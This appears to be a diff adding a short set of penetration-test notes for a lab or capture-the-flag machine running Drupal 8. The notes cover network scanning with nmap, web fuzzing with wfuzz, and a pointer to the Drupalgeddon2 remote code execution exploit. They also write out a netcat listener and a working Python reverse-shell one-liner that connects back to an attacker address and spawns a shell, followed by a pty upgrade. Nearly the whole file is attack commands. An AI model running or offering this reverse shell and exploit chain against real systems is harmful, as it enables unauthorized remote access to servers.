@@ -1,0 +1,23 @@
+nmap -sP 192.168.10.0/24
+
+wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 192.168.10.102
+
+http-generator: Drupal 8 (https://www.drupal.org)
+
+exploit Drupal 8
+
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
+
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)
+
+reverse shell cheat sheet
+http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/
+
+nc -nvlp 4444
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+
+python -c "import pty;pty.spawn('/bin/bash')"
